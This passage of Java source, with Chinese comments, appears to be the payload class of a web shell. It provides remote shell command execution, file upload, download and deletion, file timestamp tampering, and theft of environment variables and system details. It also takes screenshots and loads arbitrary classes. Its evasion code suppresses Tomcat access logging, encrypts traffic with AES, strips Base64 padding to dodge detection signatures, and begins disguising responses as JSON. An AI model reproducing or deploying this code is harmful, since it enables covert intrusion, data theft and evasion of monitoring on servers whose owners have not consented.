                        StringBuilder builder = new StringBuilder();
                        builder.append(timeValues[1]);
                        char[] cs = new char[13 - builder.length()];
                        Arrays.fill(cs, '0');
                        builder.append(cs);
                        accessTime = new Date(Long.parseLong(builder.toString()));
                     }

                     // 使用 NIO 方式设置访问时间（如果需要）
                     if (accessTime != null) {
                        try {
                           Class nioFile = Class.forName("java.nio.file.Paths");
                           Class basicFileAttributeViewClass = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                           Class filesClass = Class.forName("java.nio.file.Files");
                           if (nioFile != null && basicFileAttributeViewClass != null && filesClass != null) {
                              Path var10000 = Paths.get(fileName);
                              var10001 = class$4;
                              if (var10001 == null) {
                                 try {
                                    var10001 = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                                 } catch (ClassNotFoundException var13) {
                                    throw new NoClassDefFoundError(var13.getMessage());
                                 }

                                 class$4 = var10001;
                              }

                              BasicFileAttributeView attributeView = (BasicFileAttributeView)Files.getFileAttributeView(var10000, var10001);
                              
                              // 读取当前文件属性作为默认值
                              BasicFileAttributes currentAttrs = attributeView.readAttributes();
                              
                              // 设置时间属性：修改时间, 访问时间, 创建时间(保持不变)
                              FileTime modTime = modificationTime != null ? FileTime.fromMillis(modificationTime.getTime()) : currentAttrs.lastModifiedTime();
                              FileTime accessTimeFile = FileTime.fromMillis(accessTime.getTime());
                              FileTime createTimeFile = currentAttrs.creationTime(); // 保持创建时间不变
                              
                              // 调用 setTimes 方法
                              attributeView.setTimes(modTime, accessTimeFile, createTimeFile);
                           }
                        } catch (Exception var14) {
                           // 如果 NIO 方式失败，继续执行
                           ret = ret.isEmpty() ? "ok" : ret;
                        }
                     }
                     
                     ret = "ok";
                  } else {
                     ret = "Invalid time format. Expected: timestamp or modification|access";
                  }
               } else {
                  ret = "Java version is less than 1.2";
               }
            } else {
               ret = "no ExcuteType";
            }
         } catch (Exception var17) {
            return String.format("Exception errMsg:%s", var17.getMessage()).getBytes();
         }
      } else {
         ret = "type or attr or fileName is null";
      }

      return ret.getBytes();
   }

    /**
     * 读取指定文件的内容。
     * @return 文件的完整内容的字节数组，如果文件不存在或读取失败则返回错误信息。
     */
   public byte[] readFile() {
      String fileName = this.get("fileName");
      if (fileName != null) {
         File file = new File(fileName);

         try {
            if (file.exists() && file.isFile()) {
               byte[] data = new byte[(int)file.length()];
               FileInputStream fileInputStream;
               if (data.length > 0) {
                  int readOneLen = 0;
                  fileInputStream = new FileInputStream(file);

                  while((readOneLen += fileInputStream.read(data, readOneLen, data.length - readOneLen)) < data.length) {
                  }

                  fileInputStream.close();
               } else {
                  byte[] temData = new byte[102400];
                  fileInputStream = new FileInputStream(file);
                  int readLen = fileInputStream.read(temData);
                  if (readLen > 0) {
                     data = new byte[readLen];
                     System.arraycopy(temData, 0, data, 0, data.length);
                  }

                  Object var9 = null;
               }

               return data;
            } else {
               return "file does not exist".getBytes();
            }
         } catch (Exception var7) {
            return var7.getMessage().getBytes();
         }
      } else {
         return "No parameter fileName".getBytes();
      }
   }

    /**
     * 上传一个小文件到服务器。
     * @return "ok"或错误信息的字节数组。
     */
   public byte[] uploadFile() {
      String fileName = this.get("fileName");
      byte[] fileValue = this.getByteArray("fileValue");
      if (fileName != null && fileValue != null) {
         try {
            File file = new File(fileName);
            file.createNewFile();
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            fileOutputStream.write(fileValue);
            fileOutputStream.close();
            return "ok".getBytes();
         } catch (Exception var5) {
            return var5.getMessage().getBytes();
         }
      } else {
         return "No parameter fileName and fileValue".getBytes();
      }
   }

    /**
     * 在服务器上创建一个新的空文件。
     * @return "ok"或"fail"的字节数组。
     */
   public byte[] newFile() {
      String fileName = this.get("fileName");
      if (fileName != null) {
         File file = new File(fileName);

         try {
            return file.createNewFile() ? "ok".getBytes() : "fail".getBytes();
         } catch (Exception var4) {
            return var4.getMessage().getBytes();
         }
      } else {
         return "No parameter fileName".getBytes();
      }
   }

    /**
     * 在服务器上创建一个新的目录（包括任何必需但不存在的父目录）。
     * @return "ok"或"fail"的字节数组。
     */
   public byte[] newDir() {
      String dirName = this.get("dirName");
      if (dirName != null) {
         File file = new File(dirName);

         try {
            return file.mkdirs() ? "ok".getBytes() : "fail".getBytes();
         } catch (Exception var4) {
            return var4.getMessage().getBytes();
         }
      } else {
         return "No parameter fileName".getBytes();
      }
   }

    /**
     * 删除一个文件或目录（如果是目录，则递归删除）。
     * @return "ok"或错误信息的字节数组。
     */
   public byte[] deleteFile() {
      String dirName = this.get("fileName");
      if (dirName != null) {
         try {
            File file = new File(dirName);
            this.deleteFiles(file);
            return "ok".getBytes();
         } catch (Exception var3) {
            return var3.getMessage().getBytes();
         }
      } else {
         return "No parameter fileName".getBytes();
      }
   }

    /**
     * 移动或重命名一个文件。
     * @return "ok"或错误信息的字节数组。
     */
   public byte[] moveFile() {
      String srcFileName = this.get("srcFileName");
      String destFileName = this.get("destFileName");
      if (srcFileName != null && destFileName != null) {
         File file = new File(srcFileName);

         try {
            if (file.exists()) {
               return file.renameTo(new File(destFileName)) ? "ok".getBytes() : "fail".getBytes();
            } else {
               return "The target does not exist".getBytes();
            }
         } catch (Exception var5) {
            return var5.getMessage().getBytes();
         }
      } else {
         return "No parameter srcFileName,destFileName".getBytes();
      }
   }

    /**
     * 复制一个文件。
     * @return "ok"或错误信息的字节数组。
     */
   public byte[] copyFile() {
      String srcFileName = this.get("srcFileName");
      String destFileName = this.get("destFileName");
      if (srcFileName != null && destFileName != null) {
         File srcFile = new File(srcFileName);
         File destFile = new File(destFileName);

         try {
            if (srcFile.exists() && srcFile.isFile()) {
               FileInputStream fileInputStream = new FileInputStream(srcFile);
               FileOutputStream fileOutputStream = new FileOutputStream(destFile);
               byte[] data = new byte[5120];
               int readNum;

               while((readNum = fileInputStream.read(data)) > -1) {
                  fileOutputStream.write(data, 0, readNum);
               }

               fileInputStream.close();
               fileOutputStream.close();
               return "ok".getBytes();
            } else {
               return "The target does not exist or is not a file".getBytes();
            }
         } catch (Exception var9) {
            return var9.getMessage().getBytes();
         }
      } else {
         return "No parameter srcFileName,destFileName".getBytes();
      }
   }

    /**
     * 动态加载一个类（模块）到会话中，以备后续调用。
     * 这是一种扩展payload功能的方式，而无需重新上传整个payload。
     * @return "ok"或错误信息的字节数组。
     */
   public byte[] include() {
      byte[] binCode = this.getByteArray("binCode"); // 类的字节码
      String className = this.get("codeName"); // 为这个类指定一个名称
      if (binCode != null && className != null) {
         try {
            mainPayload_aes_base64_json payload = new mainPayload_aes_base64_json(this.getClass().getClassLoader());
            Class module = payload.g(binCode);
            this.sessionMap.put(className, module);
            return "ok".getBytes();
         } catch (Exception var5) {
            return this.sessionMap.get(className) != null ? "ok".getBytes() : var5.getMessage().getBytes();
         }
      } else {
         return "No parameter binCode,codeName".getBytes();
      }
   }

    /**
     * 从HttpSession中获取一个属性。
     * @param keyString 属性名。
     * @return 属性值。
     */
   public Object getSessionAttribute(String keyString) {
      if (this.httpSession != null) {
         Object var10001 = this.httpSession;
         Class[] var10003 = new Class[1];
         Class var10006 = class$2;
         if (var10006 == null) {
            try {
               var10006 = Class.forName("java.lang.String");
            } catch (ClassNotFoundException var2) {
               throw new NoClassDefFoundError(var2.getMessage());
            }

            class$2 = var10006;
         }

         var10003[0] = var10006;
         return this.getMethodAndInvoke(var10001, "getAttribute", var10003, new Object[]{keyString});
      } else {
         return null;
      }
   }

    /**
     * 向HttpSession中设置一个属性。
     * @param keyString 属性名。
     * @param value 属性值。
     */
   public void setSessionAttribute(String keyString, Object value) {
      if (this.httpSession != null) {
         Object var10001 = this.httpSession;
         Class[] var10003 = new Class[2];
         Class var10006 = class$2;
         if (var10006 == null) {
            try {
               var10006 = Class.forName("java.lang.String");
            } catch (ClassNotFoundException var4) {
               throw new NoClassDefFoundError(var4.getMessage());
            }

            class$2 = var10006;
         }

         var10003[0] = var10006;
         var10006 = class$5;
         if (var10006 == null) {
            try {
               var10006 = Class.forName("java.lang.Object");
            } catch (ClassNotFoundException var3) {
               throw new NoClassDefFoundError(var3.getMessage());
            }

            class$5 = var10006;
         }

         var10003[1] = var10006;
         this.getMethodAndInvoke(var10001, "setAttribute", var10003, new Object[]{keyString, value});
      }

   }

    /**
     * 执行操作系统命令。
     * @return 命令执行结果的字节数组。
     */
   public byte[] execCommand() {
      String cmdLine = this.get("cmdLine");
      if (cmdLine != null) {
         try {
            Process process;
            // 判断操作系统类型，以决定使用cmd.exe还是/bin/sh
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
               process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmdLine});
            } else {
               process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmdLine});
            }

            String result = "";
            InputStream inputStream = process.getInputStream(); // 获取标准输出
            InputStream errorInputStream = process.getErrorStream(); // 获取标准错误
            // 读取输出时使用系统默认编码，以避免乱码
            BufferedReader br = new BufferedReader(new InputStreamReader(inputStream, Charset.forName(System.getProperty("sun.jnu.encoding"))));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(errorInputStream, Charset.forName(System.getProperty("sun.jnu.encoding"))));

            String disr;
            for(disr = br.readLine(); disr != null; disr = br.readLine()) {
               result = String.valueOf(result) + disr + "\n";
            }

            for(disr = errorReader.readLine(); disr != null; disr = br.readLine()) {
               result = String.valueOf(result) + disr + "\n";
            }

            return result.getBytes();
         } catch (Exception var9) {
            return var9.getMessage().getBytes();
         }
      } else {
         return "No parameter cmdLine".getBytes();
      }
   }

    /**
     * 获取服务器基本信息。
     * @return 包含各种服务器信息的字符串的字节数组。
     */
   public byte[] getBasicsInfo() {
      try {
         Enumeration keys = System.getProperties().keys();
         String basicsInfo = new String();
         basicsInfo = basicsInfo + "FileRoot : " + this.listFileRoot() + "\n";
         basicsInfo = basicsInfo + "CurrentDir : " + (new File("")).getAbsoluteFile() + "/" + "\n";
         basicsInfo = basicsInfo + "CurrentUser : " + System.getProperty("user.name") + "\n";
         basicsInfo = basicsInfo + "DocBase : " + this.getDocBase() + "\n";
         basicsInfo = basicsInfo + "RealFile : " + this.getRealPath() + "\n";
         basicsInfo = basicsInfo + "servletRequest : " + (this.servletRequest == null ? "null" : String.valueOf(this.servletRequest.hashCode()) + "\n");
         basicsInfo = basicsInfo + "servletContext : " + (this.servletContext == null ? "null" : String.valueOf(this.servletContext.hashCode()) + "\n");
         basicsInfo = basicsInfo + "httpSession : " + (this.httpSession == null ? "null" : String.valueOf(this.httpSession.hashCode()) + "\n");

         try {
            basicsInfo = basicsInfo + "OsInfo : " + String.format("os.name: %s os.version: %s os.arch: %s", System.getProperty("os.name"), System.getProperty("os.version"), System.getProperty("os.arch")) + "\n";
         } catch (Exception var6) {
            basicsInfo = basicsInfo + "OsInfo : " + var6.getMessage() + "\n";
         }

         basicsInfo = basicsInfo + "IPList : " + getLocalIPList() + "\n";

         // 添加所有系统属性
         while(keys.hasMoreElements()) {
            Object object = keys.nextElement();
            if (object instanceof String) {
               String key = (String)object;
               basicsInfo = basicsInfo + key + " : " + System.getProperty(key) + "\n";
            }
         }

         // 添加所有环境变量
         Map envMap = this.getEnv();
         String key;
         if (envMap != null) {
            for(Iterator iterator = envMap.keySet().iterator(); iterator.hasNext(); basicsInfo = basicsInfo + key + " : " + envMap.get(key) + "\n") {
               key = (String)iterator.next();
            }
         }

         return basicsInfo.getBytes();
      } catch (Exception var7) {
         return var7.getMessage().getBytes();
      }
   }

    /**
     * 截取服务器屏幕。
     * @return PNG格式的屏幕截图数据的字节数组。
     */
   public byte[] screen() {
      try {
         Robot robot = new Robot();
         BufferedImage as = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit.getDefaultToolkit().getScreenSize().height));
         ByteArrayOutputStream bs = new ByteArrayOutputStream();
         ImageIO.write(as, "png", ImageIO.createImageOutputStream(bs));
         byte[] data = bs.toByteArray();
         bs.close();
         return data;
      } catch (Exception var5) {
         return var5.getMessage().getBytes();
      }
   }

    

    /**
     * 使当前的HttpSession失效，从而销毁payload自身。
     * @return "ok"的字节数组。
     */
   public byte[] close() {
      try {
         if (this.httpSession != null) {
            this.getMethodAndInvoke(this.httpSession, "invalidate", (Class[])null, (Object[])null);
         }

         return "ok".getBytes();
      } catch (Exception var2) {
         return var2.getMessage().getBytes();
      }
   }

    /**
     * 大文件上传。支持分块上传和断点续传。
     * @return "ok"或错误信息的字节数组。
     */
   public byte[] bigFileUpload() {
      String fileName = this.get("fileName");
      byte[] fileContents = this.getByteArray("fileContents");
      String position = this.get("position"); // 文件写入的起始位置

      try {
         if (position == null) {
            // 如果没有指定位置，则以追加模式写入
            FileOutputStream fileOutputStream = new FileOutputStream(fileName, true);
            fileOutputStream.write(fileContents);
            fileOutputStream.flush();
            fileOutputStream.close();
         } else {
            // 如果指定了位置，则使用RandomAccessFile进行随机写入
            RandomAccessFile fileOutputStream = new RandomAccessFile(fileName, "rw");
            fileOutputStream.seek((long)Integer.parseInt(position));
            fileOutputStream.write(fileContents);
            fileOutputStream.close();
         }

         return "ok".getBytes();
      } catch (Exception var5) {
         return String.format("Exception errMsg:%s", var5.getMessage()).getBytes();
      }
   }

    /**
     * 获取文件大小。
     * @return 文件大小的字节数组表示，如果文件不可读则返回错误信息。
     */
   public byte[] getFileSize() {
      String fileName = this.get("fileName");
      
      try {
         File file = new File(fileName);
         return file.canRead() ? String.valueOf(file.length()).getBytes() : "not read".getBytes();
      } catch (Exception e) {
         return String.format("Exception errMsg:%s", e.getMessage()).getBytes();
      }
   }

    /**
     * 按位置读取文件数据块。
     * @return 文件块内容的字节数组。
     */
   public byte[] readFileByPosition() {
      String fileName = this.get("fileName");
      String readByteNumString = this.get("readByteNum");
      String positionString = this.get("position");

      try {
         // 读取指定块的数据
         int position = Integer.valueOf(positionString);
         int readByteNum = Integer.valueOf(readByteNumString);
         byte[] readData = new byte[readByteNum];
         FileInputStream fileInputStream = new FileInputStream(fileName);
         fileInputStream.skip((long)position); // 跳到指定位置
         int readNum = fileInputStream.read(readData);
         fileInputStream.close();
         // 如果实际读取的字节数小于请求的字节数（例如到了文件末尾），则返回实际读取的部分
         return readNum == readData.length ? readData : copyOf(readData, readNum);
      } catch (Exception e) {
         return String.format("Exception errMsg:%s", e.getMessage()).getBytes();
      }
   }


    /**
     * 复制字节数组的一部分。
     * @param original 原始数组。
     * @param newLength 新数组的长度。
     * @return 新的字节数组。
     */
   public static byte[] copyOf(byte[] original, int newLength) {
      byte[] arrayOfByte = new byte[newLength];
      System.arraycopy(original, 0, arrayOfByte, 0, Math.min(original.length, newLength));
      return arrayOfByte;
   }

    /**
     * 获取系统环境变量。
     * @return 包含环境变量的Map。
     */
   public Map getEnv() {
      try {
         int jreVersion = Integer.parseInt(System.getProperty("java.version").substring(2, 3));
         if (jreVersion >= 5) {
            try {
               Class var10000 = class$6;
               if (var10000 == null) {
                  try {
                     var10000 = Class.forName("java.lang.System");
                  } catch (ClassNotFoundException var4) {
                     throw new NoClassDefFoundError(var4.getMessage());
                  }

                  class$6 = var10000;
               }

               Method method = var10000.getMethod("getenv");
               if (method != null) {
                  var10000 = method.getReturnType();
                  Class var10001 = class$7;
                  if (var10001 == null) {
                     try {
                        var10001 = Class.forName("java.util.Map");
                     } catch (ClassNotFoundException var3) {
                        throw new NoClassDefFoundError(var3.getMessage());
                     }

                     class$7 = var10001;
                  }

                  if (var10000.isAssignableFrom(var10001)) {
                     return (Map)method.invoke((Object)null, (Object[])null);
                  }
               }

               return null;
            } catch (Exception var5) {
               return null;
            }
         } else {
            return null;
         }
      } catch (Exception var6) {
         return null;
      }
   }

    /**
     * 获取Web应用的文档根目录（通常是Web服务器部署应用的目录）。
     * @return 路径字符串。
     */
   public String getDocBase() {
      try {
         return this.getRealPath();
      } catch (Exception var2) {
         return var2.getMessage();
      }
   }

    /**
     * 获取本地所有网络接口的IP地址列表。
     * @return IP地址列表的字符串表示。
     */
   public static String getLocalIPList() {
      List ipList = new ArrayList();

      try {
         Enumeration networkInterfaces = NetworkInterface.getNetworkInterfaces();

         while(networkInterfaces.hasMoreElements()) {
            NetworkInterface networkInterface = (NetworkInterface)networkInterfaces.nextElement();
            Enumeration inetAddresses = networkInterface.getInetAddresses();

            while(inetAddresses.hasMoreElements()) {
               InetAddress inetAddress = (InetAddress)inetAddresses.nextElement();
               if (inetAddress != null) {
                  String ip = inetAddress.getHostAddress();
                  ipList.add(ip);
               }
            }
         }
      } catch (Exception var6) {
      }

      return Arrays.toString(ipList.toArray());
   }

    /**
     * 获取Web应用的真实物理路径。
     * @return 路径字符串。
     */
   public String getRealPath() {
      try {
         if (this.servletContext != null) {
            Class var10001 = this.servletContext.getClass();
            Class[] var10003 = new Class[1];
            Class var10006 = class$2;
            if (var10006 == null) {
               try {
                  var10006 = Class.forName("java.lang.String");
               } catch (ClassNotFoundException var3) {
                  throw new NoClassDefFoundError(var3.getMessage());
               }

               class$2 = var10006;
            }

            var10003[0] = var10006;
            Method getRealPathMethod = this.getMethodByClass(var10001, "getRealPath", var10003);
            if (getRealPathMethod != null) {
               Object retObject = getRealPathMethod.invoke(this.servletContext, "/");
               return retObject != null ? retObject.toString() : "Null";
            } else {
               return "no method getRealPathMethod";
            }
         } else {
            return "servletContext is Null";
         }
      } catch (Exception var4) {
         return var4.getMessage();
      }
   }

    /**
     * 递归删除文件或目录。
     * @param f 要删除的文件或目录。
     * @throws Exception
     */
   public void deleteFiles(File f) throws Exception {
      if (f.isDirectory()) {
         File[] x = f.listFiles();

         for(int i = 0; i < x.length; ++i) {
            File fs = x[i];
            this.deleteFiles(fs);
         }
      }

      f.delete();
   }

    /**
     * 通过反射调用一个对象的方法。
     * @param obj 目标对象。
     * @param methodName 方法名。
     * @param parameters 方法参数。
     * @return 方法的返回值。
     */
   Object invoke(Object obj, String methodName, Object[] parameters) {
      try {
         ArrayList classes = new ArrayList();
         if (parameters != null) {
            for(int i = 0; i < parameters.length; ++i) {
               Object o1 = parameters[i];
               if (o1 != null) {
                  classes.add(o1.getClass());
               } else {
                  classes.add((Object)null);
               }
            }
         }

         Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[0]));
         return method.invoke(obj, parameters);
      } catch (Exception var7) {
         return null;
      }
   }

    /**
     * 通过反射查找并调用一个对象的方法（指定参数类型）。
     * @param obj 目标对象。
     * @param methodName 方法名。
     * @param parameterClass 参数类型数组。
     * @param parameters 参数值数组。
     * @return 方法的返回值。
     */
   Object getMethodAndInvoke(Object obj, String methodName, Class[] parameterClass, Object[] parameters) {
      try {
         Method method = this.getMethodByClass(obj.getClass(), methodName, parameterClass);
         if (method != null) {
            return method.invoke(obj, parameters);
         }
      } catch (Exception var6) {
      }

      return null;
   }



    /**
     * 在一个类及其所有父类中查找一个方法。
     * @param cs 起始类。
     * @param methodName 方法名。
     * @param parameters 参数类型数组。
     * @return 找到的方法对象，或null。
     */
   Method getMethodByClass(Class cs, String methodName, Class[] parameters) {
      Method method = null;

      while(cs != null) {
         try {
            method = cs.getDeclaredMethod(methodName, parameters);
            method.setAccessible(true);
            cs = null;
         } catch (Exception var6) {
            cs = cs.getSuperclass();
         }
      }

      return method;
   }

    /**
     * 通过反射获取一个对象的字段值。
     * @param obj 目标对象。
     * @param fieldName 字段名。
     * @return 字段的值。
     * @throws Exception
     */
   public static Object getFieldValue(Object obj, String fieldName) throws Exception {
      Field f = null;
      if (obj instanceof Field) {
         f = (Field)obj;
      } else {
         Method method = null;
         Class cs = obj.getClass();

         while(cs != null) {
            try {
               f = cs.getDeclaredField(fieldName);
               cs = null;
            } catch (Exception var6) {
               cs = cs.getSuperclass();
            }
         }
      }

      f.setAccessible(true);
      return f.get(obj);
   }

    /**
     * 尝试修改Tomcat的访问日志Valve，以隐藏当前请求的日志。
     * 这是一个高级的隐蔽技术，通过反射深入到Servlet容器内部结构。
     * @param servletContext Servlet上下文。
     */
   private void noLog(Object servletContext) {
      try {
         Object applicationContext = getFieldValue(servletContext, "context");
         Object container = getFieldValue(applicationContext, "context");

         ArrayList arrayList;
         for(arrayList = new ArrayList(); container != null; container = this.invoke(container, "getParent", (Object[])null)) {
            arrayList.add(container);
         }

         label84:
         for(int i = 0; i < arrayList.size(); ++i) {
            try {
               Object pipeline = this.invoke(arrayList.get(i), "getPipeline", (Object[])null);
               if (pipeline != null) {
                  Object valve = this.invoke(pipeline, "getFirst", (Object[])null);

                  while(true) {
                     while(true) {
                        if (valve == null) {
                           continue label84;
                        }

                                                if (this.getMethodByClass(valve.getClass(), "getCondition", (Class[])null) != null) {
                           Class var10001 = valve.getClass();
                           Class[] var10003 = new Class[1];
                           Class var10006 = class$2;
                           if (var10006 == null) {
                              try {
                                 var10006 = Class.forName("java.lang.String");
                              } catch (ClassNotFoundException var12) {
                                 throw new NoClassDefFoundError(var12.getMessage());
                              }

                              class$2 = var10006;
                           }

                           var10003[0] = var10006;
                           if (this.getMethodByClass(var10001, "setCondition", var10003) != null) {
                              String condition = (String)this.invoke(valve, "getCondition", new Object[0]);
                              condition = condition == null ? "FuckLog" : condition;
                              this.invoke(valve, "setCondition", new Object[]{condition});
                              var10001 = this.servletRequest.getClass();
                              var10003 = new Class[2];
                              var10006 = class$2;
                              if (var10006 == null) {
                                 try {
                                    var10006 = Class.forName("java.lang.String");
                                 } catch (ClassNotFoundException var11) {
                                    throw new NoClassDefFoundError(var11.getMessage());
                                 }

                                 class$2 = var10006;
                              }

                              var10003[0] = var10006;
                              var10006 = class$2;
                              if (var10006 == null) {
                                 try {
                                    var10006 = Class.forName("java.lang.String");
                                 } catch (ClassNotFoundException var10) {
                                    throw new NoClassDefFoundError(var10.getMessage());
                                 }

                                 class$2 = var10006;
                              }

                              var10003[1] = var10006;
                               Method setAttributeMethod = this.getMethodByClass(var10001, "setAttribute", var10003);
                setAttributeMethod.invoke(this.servletRequest, new Object[]{condition, condition});
                              valve = this.invoke(valve, "getNext", (Object[])null);
                              continue;
                           }
                        }

                        if (Class.forName("org.apache.catalina.Valve", false, applicationContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass())) {
                           valve = this.invoke(valve, "getNext", (Object[])null);
                        } else {
                           valve = null;
                        }
                     }
                  }
               }
            } catch (Exception var13) {
            }
         }
      } catch (Exception var14) {
      }

   }

    /**
     * 动态加载一个类，失败时返回null而不是抛出异常。
     * @param name 类名。
     * @return 类对象或null。
     */
   private static Class getClass(String name) {
      try {
         return Class.forName(name);
      } catch (Exception var2) {
         return null;
      }
   }

    /**
     * 将4字节的byte数组转换为int。
     * @param bytes 字节数组。
     * @return 整数。
     */
   public static int bytesToInt(byte[] bytes) {
      int i = bytes[0] & 255 | (bytes[1] & 255) << 8 | (bytes[2] & 255) << 16 | (bytes[3] & 255) << 24;
      return i;
   }

    /**
     * 对字符串进行Base64编码。
     * @param data 输入字符串。
     * @return Base64编码后的字符串。
     */
   public String base64Encode(String data) {
      return base64Encode(data.getBytes());
   }

    /**
     * 对字节数组进行Base64编码的自定义实现。
     * @param src 源字节数组。
     * @return Base64编码后的字符串。
     */
   public static String base64Encode(byte[] src) {
      int off = 0;
      int end = src.length;
      byte[] dst = new byte[4 * ((src.length + 2) / 3)];
      int linemax = -1;
      boolean doPadding = true;
      char[] base64 = toBase64;
      int sp = off;
      int slen = (end - off) / 3 * 3;
      int sl = off + slen;
      if (linemax > 0 && slen > linemax / 4 * 3) {
         slen = linemax / 4 * 3;
      }

      int dp;
      int b0;
      int b1;
      for(dp = 0; sp < sl; sp = b0) {
         b0 = Math.min(sp + slen, sl);
         b1 = sp;

         int bits;
         for(int dp0 = dp; b1 < b0; dst[dp0++] = (byte)base64[bits & 63]) {
            bits = (src[b1++] & 255) << 16 | (src[b1++] & 255) << 8 | src[b1++] & 255;
            dst[dp0++] = (byte)base64[bits >>> 18 & 63];
            dst[dp0++] = (byte)base64[bits >>> 12 & 63];
            dst[dp0++] = (byte)base64[bits >>> 6 & 63];
         }

         b1 = (b0 - sp) / 3 * 4;
         dp += b1;
      }

      if (sp < end) {
         b0 = src[sp++] & 255;
         dst[dp++] = (byte)base64[b0 >> 2];
         if (sp == end) {
            dst[dp++] = (byte)base64[b0 << 4 & 63];
            if (doPadding) {
               dst[dp++] = 61;
               dst[dp++] = 61;
            }
         } else {
            b1 = src[sp++] & 255;
            dst[dp++] = (byte)base64[b0 << 4 & 63 | b1 >> 4];
            dst[dp++] = (byte)base64[b1 << 2 & 63];
            if (doPadding) {
               dst[dp++] = 61;
            }
         }
      }

      // 移除末尾的填充符 '=' 以减少特征
      String result = new String(dst);
      return result.replaceAll("=+$", "");
   }

    /**
     * 对Base64编码的字符串进行解码的自定义实现。
     * @param base64Str Base64字符串。
     * @return 解码后的字节数组。
     */
   public static byte[] base64Decode(String base64Str) {
      if (base64Str.length() == 0) {
         return new byte[0];
      } else {
         // 重新添加必要的填充符以正确解码
         int paddingLength = (4 - (base64Str.length() % 4)) % 4;
         if (paddingLength > 0) {
            StringBuilder sb = new StringBuilder(base64Str);
            for (int i = 0; i < paddingLength; i++) {
               sb.append('=');
            }
            base64Str = sb.toString();
         }
         byte[] src = base64Str.getBytes();
         int sp = 0;
         int sl = src.length;
         int paddings = 0;
         int len = sl - sp;
         if (src[sl - 1] == 61) {
            ++paddings;
            if (src[sl - 2] == 61) {
               ++paddings;
            }
         }

         if (paddings == 0 && (len & 3) != 0) {
            paddings = 4 - (len & 3);
         }

         byte[] dst = new byte[3 * ((len + 3) / 4) - paddings];
         int[] base64 = new int[256];
         Arrays.fill(base64, -1);

         int dp;
         for(dp = 0; dp < toBase64.length; base64[toBase64[dp]] = dp++) {
         }

         base64[61] = -2;
         dp = 0;
         int bits = 0;
         int shiftto = 18;

         while(sp < sl) {
            int b = src[sp++] & 255;
            if ((b = base64[b]) < 0 && b == -2) {
               if (shiftto == 6 && (sp == sl || src[sp++] != 61) || shiftto == 18) {
                  throw new IllegalArgumentException("Input byte array has wrong 4-byte ending unit");
               }
               break;
            }

            bits |= b << shiftto;
            shiftto -= 6;
            if (shiftto < 0) {
               dst[dp++] = (byte)(bits >> 16);
               dst[dp++] = (byte)(bits >> 8);
               dst[dp++] = (byte)bits;
               shiftto = 18;
               bits = 0;
            }
         }

         if (shiftto == 6) {
            dst[dp++] = (byte)(bits >> 16);
         } else if (shiftto == 0) {
            dst[dp++] = (byte)(bits >> 16);
            dst[dp++] = (byte)(bits >> 8);
         } else if (shiftto == 12) {
            throw new IllegalArgumentException("Last unit does not have enough valid bits");
         }

         if (dp != dst.length) {
            byte[] arrayOfByte = new byte[dp];
            System.arraycopy(dst, 0, arrayOfByte, 0, Math.min(dst.length, dp));
            dst = arrayOfByte;
         }

         return dst;
      }
   }

    // ===== 响应封装辅助方法 (从JSP移植) =====
    
    /**
     * AES加密/解密
     */
    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(sc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }


    /**
     * MD5哈希计算
     */
    public static String md5(String s) {
        try {
            java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
            byte[] hash = md.digest(s.getBytes("UTF-8"));
            StringBuilder hexString = new StringBuilder();
            for (byte b : hash) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            return hexString.toString().toUpperCase();
        } catch (Exception e) {
            return null;
        }
    }
 
    /**
     * 16进制字符串转Base64编码（用于标记编码）
     */
    private String hexToBase64(String hex) {
        try {
            // 将16进制字符串转换为字节数组
            byte[] bytes = new byte[hex.length() / 2];
            for (int i = 0; i < hex.length(); i += 2) {
                bytes[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                + Character.digit(hex.charAt(i + 1), 16));
            }
            // 进行Base64编码并移除填充符
            return base64Encode(bytes);
        } catch (Exception e) {
            // 如果转换失败，返回原16进制字符串
            return hex;
        }
    }

    /**
     * 动态标记生成
     */
    public String[] generateDynamicMarkers(String cookieValue, String secretKey) {
        try {
            // 如果没有cookie值，使用默认值
            if (cookieValue == null || cookieValue.isEmpty()) {
                cookieValue = "default_session";
            }
            
            // 与客户端一致：使用 cookie + secretKey 作为MD5输入
            String seed = cookieValue + secretKey;
            
            // 对种子进行MD5加密
            String md5Hash = md5(seed);
            
            if (md5Hash != null && md5Hash.length() >= 32) {
                // MD5结果为32位16进制，取前16位和后16位
                String leftHex = md5Hash.substring(0, 16);
                String rightHex = md5Hash.substring(16, 32);
                
                // 将16进制标记转换为Base64编码，使其与加密数据字符集一致
                String leftMarker = hexToBase64(leftHex);
                String rightMarker = hexToBase64(rightHex);
                
                return new String[]{leftMarker, rightMarker};
            }
            
            // 如果MD5失败，降级处理
            throw new Exception("MD5 calculation failed");
        } catch (Exception e) {
            // 降级到固定标记（使用MD5）
            try {
                String fallbackSeed = "fallback" + (cookieValue != null ? cookieValue : "default") + secretKey;
                String fallbackHash = md5(fallbackSeed);
                
                if (fallbackHash != null && fallbackHash.length() >= 32) {
                    String leftHex = fallbackHash.substring(0, 16);
                    String rightHex = fallbackHash.substring(16, 32);
                    
                    String leftMarker = hexToBase64(leftHex);
                    String rightMarker = hexToBase64(rightHex);
                    
                    return new String[]{leftMarker, rightMarker};
                }
                
                throw new Exception("Fallback MD5 failed");
            } catch (Exception ex) {
                // 最终降级 - 使用预编码的Base64固定标记
                return new String[]{"U1RBUlRE", "RU5EREFUA"}; // "STARTD" 和 "ENDDATA"的Base64
            }
        }
    }

    /**
     * 创建JSON伪装响应
     * 将加密的payload数据包装成看起来正常的JSON API响应
